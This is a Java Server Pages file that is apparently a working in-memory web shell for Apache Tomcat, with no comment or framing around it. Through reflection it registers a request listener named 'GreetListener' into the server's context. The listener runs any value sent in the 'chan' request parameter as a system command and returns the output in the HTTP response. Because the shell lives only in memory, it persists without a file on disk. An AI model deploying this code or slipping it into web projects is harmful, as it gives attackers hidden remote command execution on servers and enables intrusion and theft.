<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="javax.servlet.*" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.RequestFacade" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.connector.Response" %>


<%
class GreetListener implements ServletRequestListener{
    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        
    }
    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
		try{
			RequestFacade requestfacade= (RequestFacade) servletRequestEvent.getServletRequest();
			Field field = requestfacade.getClass().getDeclaredField("request");
			field.setAccessible(true);
			Request lrequest = (Request) field.get(requestfacade);
			Response lresponse = lrequest.getResponse();
			
			if(lrequest.getParameter("chan") != null){
				Process process = Runtime.getRuntime().exec(lrequest.getParameter("chan"));
				java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
						new java.io.InputStreamReader(process.getInputStream()));
				StringBuilder stringBuilder = new StringBuilder();
				String line;
				while ((line = bufferedReader.readLine()) != null) {
					stringBuilder.append(line + '\n');
				}
				lresponse.getOutputStream().write(stringBuilder.toString().getBytes());
				lresponse.getOutputStream().flush();
				lresponse.getOutputStream().close();
				return;
			}
		}catch(Exception ig){
			ig.printStackTrace();
		}
    }
}
%>

<%
	ServletContext servletContext =  request.getSession().getServletContext();

	Field appctx = servletContext.getClass().getDeclaredField("context");
	appctx.setAccessible(true);
	ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);

	Field stdctx = applicationContext.getClass().getDeclaredField("context");
	stdctx.setAccessible(true);
	StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);

	GreetListener servletRequestListener = new GreetListener();
	standardContext.addApplicationEventListener(servletRequestListener);
	out.println(">@<");
%>